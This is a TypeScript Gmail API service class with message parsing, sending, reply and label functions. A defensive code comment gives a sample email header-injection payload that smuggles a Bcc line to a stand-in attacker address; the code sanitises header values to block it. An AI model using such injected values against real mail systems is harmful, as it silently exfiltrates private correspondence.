import { google, type gmail_v1, type Auth } from "googleapis";

export interface GmailMessage {
  id: string;
  threadId: string;
  labelIds?: string[];
  snippet?: string;
  subject?: string;
  from?: string;
  to?: string;
  date?: string;
  body?: string;
  bodyHtml?: string;
  isUnread?: boolean;
}

export interface GmailLabel {
  id: string;
  name: string;
  type?: string;
  messagesTotal?: number;
  messagesUnread?: number;
}

export interface GmailThread {
  id: string;
  snippet?: string;
  historyId?: string;
  messages?: GmailMessage[];
}

export interface SendEmailOptions {
  to: string;
  subject: string;
  body: string;
  cc?: string;
  bcc?: string;
  isHtml?: boolean;
  replyToMessageId?: string;
  threadId?: string;
}

interface MessageBodies {
  // Every text/plain segment, joined.
  text?: string;
  // The first text/html part.
  html?: string;
  // The first other text/* subtype (text/calendar, Apple Mail's
  // text/watch-html), used only when there is nothing better.
  other?: string;
}

// Header values are interpolated into a raw RFC 822 message, so a CR or LF in
// one lets the caller inject arbitrary extra headers. replyToEmail feeds this
// a Subject and From read straight out of the inbox, which makes the sender of
// an inbound mail the attacker: "Hi\r\nBcc: attacker@evil.com" would silently
// blind-copy the reply.
const headerValue = (value: string): string =>
  value.replace(/[\r\n]+/g, " ").trim();

// Which collected body to hand back as `body`. A plain-text alternative that
// is only whitespace is a placeholder, not content - treating it as the body
// is what leaves newsletters looking empty.
const preferredBody = (bodies: MessageBodies, includeHtml: boolean): string => {
  if (bodies.text?.trim()) {
    return bodies.text;
  }
  if (includeHtml && bodies.html) {
    return bodies.html;
  }
  return bodies.other ?? bodies.text ?? "";
};

export class GmailService {
  private readonly gmail: gmail_v1.Gmail;

  constructor(authClient: Auth.OAuth2Client) {
    this.gmail = google.gmail({ version: "v1", auth: authClient });
  }

  // Gmail nests bodies arbitrarily deep: a mail with an attachment is
  // multipart/mixed > multipart/alternative > text/html, so scanning only
  // payload.parts finds a multipart container, never the text, and the body
  // comes back empty. Where it did match, `find` hit text/plain first and the
  // HTML alternative was dropped entirely. Walk the whole tree and keep both.
  //
  // Iterative, not recursive: the tree shape comes straight from inbound mail,
  // so a deeply nested message would otherwise blow the call stack with a
  // RangeError instead of failing the way the rest of this service does.
  private collectBodies(
    root: gmail_v1.Schema$MessagePart | undefined
  ): MessageBodies {
    const found: MessageBodies = {};
    const plain: string[] = [];
    const stack: gmail_v1.Schema$MessagePart[] = root ? [root] : [];

    while (stack.length > 0) {
      const part = stack.pop();
      if (!part) {
        continue;
      }

      // MIME types are case-insensitive (RFC 2045 5.1). Lowercase once, up
      // front, so every check below agrees on the spelling.
      const mimeType = part.mimeType?.toLowerCase();

      // A forwarded .eml is a whole message of its own; its text would
      // otherwise be handed back as this message's body.
      if (mimeType === "message/rfc822") {
        continue;
      }

      // An attachment is not the body - but it can still be a container, so
      // skip only the recording and keep walking its children.
      const data = part.body?.data;
      if (data && !part.filename) {
        const decoded = Buffer.from(data, "base64url").toString("utf-8");
        if (mimeType === "text/html") {
          found.html ??= decoded;
        } else if (!mimeType || mimeType === "text/plain") {
          plain.push(decoded);
        } else if (mimeType.startsWith("text/")) {
          // text/calendar, text/enriched, text/watch-html: still body content,
          // where a non-text part with inline data (an inline image) is not.
          found.other ??= decoded;
        }
      }

      // Reversed, so a LIFO stack still visits siblings in document order -
      // MIME lists alternatives simplest-first and we keep the first of each.
      const children = part.parts || [];
      for (let i = children.length - 1; i >= 0; i--) {
        stack.push(children[i]);
      }
    }

    if (plain.length > 0) {
      // Mail split around an inline image, or prefixed with an external-sender
      // banner, arrives as several sibling text parts. The body is all of them
      // - keeping only the first returns the banner and drops the message.
      found.text = plain.join("\n\n");
    }

    return found;
  }

  // getMessage and getThread built this literal separately and had already
  // drifted apart; one copy keeps them honest.
  private toMessage(
    msg: gmail_v1.Schema$Message,
    options: { includeHtml?: boolean } = {}
  ): GmailMessage {
    const includeHtml = options.includeHtml !== false;
    const headers = msg.payload?.headers || [];
    const getHeader = (name: string): string | null | undefined =>
      headers.find((h) => h.name?.toLowerCase() === name.toLowerCase())?.value;
    const bodies = this.collectBodies(msg.payload);

    return {
      id: msg.id || "",
      threadId: msg.threadId || "",
      labelIds: msg.labelIds || undefined,
      snippet: msg.snippet || undefined,
      subject: getHeader("Subject") || undefined,
      from: getHeader("From") || undefined,
      to: getHeader("To") || undefined,
      date: getHeader("Date") || undefined,
      body: preferredBody(bodies, includeHtml),
      bodyHtml: includeHtml ? bodies.html : undefined,
      isUnread: msg.labelIds?.includes("UNREAD"),
    };
  }

  // Profile

  public async getProfile(): Promise<{
    emailAddress: string;
    messagesTotal: number;
    threadsTotal: number;
    historyId: string;
  }> {
    const response = await this.gmail.users.getProfile({ userId: "me" });
    return {
      emailAddress: response.data.emailAddress || "",
      messagesTotal: response.data.messagesTotal || 0,
      threadsTotal: response.data.threadsTotal || 0,
      historyId: response.data.historyId || "",
    };
  }

  // Labels

  public async listLabels(): Promise<GmailLabel[]> {
    const response = await this.gmail.users.labels.list({ userId: "me" });
    return (response.data.labels || []).map((label) => ({
      id: label.id || "",
      name: label.name || "",
      type: label.type || undefined,
      messagesTotal: label.messagesTotal || undefined,
      messagesUnread: label.messagesUnread || undefined,
    }));
  }

  public async getLabel(labelId: string): Promise<GmailLabel> {
    const response = await this.gmail.users.labels.get({
      userId: "me",
      id: labelId,
    });
    return {
      id: response.data.id || "",
      name: response.data.name || "",
      type: response.data.type || undefined,
      messagesTotal: response.data.messagesTotal || undefined,
      messagesUnread: response.data.messagesUnread || undefined,
    };
  }

  // Messages

  public async listMessages(options: {
    maxResults?: number;
    pageToken?: string;
    labelIds?: string[];
    q?: string;
    includeSpamTrash?: boolean;
  } = {}): Promise<{ messages: GmailMessage[]; nextPageToken?: string }> {
    const response = await this.gmail.users.messages.list({
      userId: "me",
      maxResults: options.maxResults || 20,
      pageToken: options.pageToken,
      labelIds: options.labelIds,
      q: options.q,
      includeSpamTrash: options.includeSpamTrash || false,
    });

    const messages: GmailMessage[] = [];
    for (const msg of response.data.messages || []) {
      if (msg.id) {
        // One full HTML document per result would put megabytes of newsletter
        // markup in a single tool response, so list results carry no HTML in
        // either field; `snippet` is there for HTML-only mail.
        const fullMsg = await this.getMessage(msg.id, { includeHtml: false });
        messages.push(fullMsg);
      }
    }

    return {
      messages,
      nextPageToken: response.data.nextPageToken || undefined,
    };
  }

  public async getMessage(
    messageId: string,
    options: { includeHtml?: boolean } = {}
  ): Promise<GmailMessage> {
    const response = await this.gmail.users.messages.get({
      userId: "me",
      id: messageId,
      format: "full",
    });

    return this.toMessage(response.data, options);
  }

  public async sendEmail(options: SendEmailOptions): Promise<GmailMessage> {
    const messageParts = [
      `To: ${headerValue(options.to)}`,
      `Subject: ${headerValue(options.subject)}`,
    ];

    if (options.cc) {
      messageParts.push(`Cc: ${headerValue(options.cc)}`);
    }
    if (options.bcc) {
      messageParts.push(`Bcc: ${headerValue(options.bcc)}`);
    }

    if (options.isHtml) {
      messageParts.push("Content-Type: text/html; charset=utf-8");
    } else {
      messageParts.push("Content-Type: text/plain; charset=utf-8");
    }

    messageParts.push("");
    messageParts.push(options.body);

    const rawMessage = Buffer.from(messageParts.join("\r\n"))
      .toString("base64")
      .replace(/\+/g, "-")
      .replace(/\//g, "_")
      .replace(/=+$/, "");

    const requestBody: gmail_v1.Schema$Message = {
      raw: rawMessage,
    };

    if (options.threadId) {
      requestBody.threadId = options.threadId;
    }

    const response = await this.gmail.users.messages.send({
      userId: "me",
      requestBody,
    });

    return this.getMessage(response.data.id!);
  }

  public async replyToEmail(
    messageId: string,
    body: string,
    isHtml = false
  ): Promise<GmailMessage> {
    const originalMessage = await this.getMessage(messageId);

    return this.sendEmail({
      to: originalMessage.from || "",
      subject: originalMessage.subject?.startsWith("Re:")
        ? originalMessage.subject
        : `Re: ${originalMessage.subject}`,
      body,
      isHtml,
      threadId: originalMessage.threadId,
      replyToMessageId: messageId,
    });
  }

  public async trashMessage(messageId: string): Promise<void> {
    await this.gmail.users.messages.trash({
      userId: "me",
      id: messageId,
    });
  }

  public async untrashMessage(messageId: string): Promise<void> {
    await this.gmail.users.messages.untrash({
      userId: "me",
      id: messageId,
    });
  }

  public async deleteMessage(messageId: string): Promise<void> {
    await this.gmail.users.messages.delete({
      userId: "me",
      id: messageId,
    });
  }

  public async markAsRead(messageId: string): Promise<void> {
    await this.gmail.users.messages.modify({
      userId: "me",
      id: messageId,
      requestBody: {
        removeLabelIds: ["UNREAD"],
      },
    });
  }

  public async markAsUnread(messageId: string): Promise<void> {
    await this.gmail.users.messages.modify({
      userId: "me",
      id: messageId,
      requestBody: {
        addLabelIds: ["UNREAD"],
      },
    });
  }

  public async addLabels(messageId: string, labelIds: string[]): Promise<void> {
    await this.gmail.users.messages.modify({
      userId: "me",
      id: messageId,
      requestBody: {
        addLabelIds: labelIds,
      },
    });
  }

  public async removeLabels(messageId: string, labelIds: string[]): Promise<void> {
    await this.gmail.users.messages.modify({
      userId: "me",
      id: messageId,
      requestBody: {
        removeLabelIds: labelIds,
      },
    });
  }

  // Threads

  public async listThreads(options: {
    maxResults?: number;
    pageToken?: string;
    labelIds?: string[];
    q?: string;
  } = {}): Promise<{ threads: GmailThread[]; nextPageToken?: string }> {
    const response = await this.gmail.users.threads.list({
      userId: "me",
      maxResults: options.maxResults || 20,
      pageToken: options.pageToken,
      labelIds: options.labelIds,
      q: options.q,
    });

    const threads: GmailThread[] = (response.data.threads || []).map((t) => ({
      id: t.id || "",
      snippet: t.snippet || undefined,
      historyId: t.historyId || undefined,
    }));

    return {
      threads,
      nextPageToken: response.data.nextPageToken || undefined,
    };
  }

  public async getThread(threadId: string): Promise<GmailThread> {
    const response = await this.gmail.users.threads.get({
      userId: "me",
      id: threadId,
      format: "full",
    });

    const messages = (response.data.messages || []).map((msg) =>
      this.toMessage(msg)
    );

    return {
      id: response.data.id || "",
      snippet: response.data.snippet || undefined,
      historyId: response.data.historyId || undefined,
      messages,
    };
  }

  public async trashThread(threadId: string): Promise<void> {
    await this.gmail.users.threads.trash({
      userId: "me",
      id: threadId,
    });
  }

  // Search helpers

  public async searchEmails(query: string, maxResults = 20): Promise<GmailMessage[]> {
    const { messages } = await this.listMessages({ q: query, maxResults });
    return messages;
  }

  public async getUnreadEmails(maxResults = 20): Promise<GmailMessage[]> {
    return this.searchEmails("is:unread", maxResults);
  }

  public async getStarredEmails(maxResults = 20): Promise<GmailMessage[]> {
    return this.searchEmails("is:starred", maxResults);
  }

  public async getImportantEmails(maxResults = 20): Promise<GmailMessage[]> {
    return this.searchEmails("is:important", maxResults);
  }
}

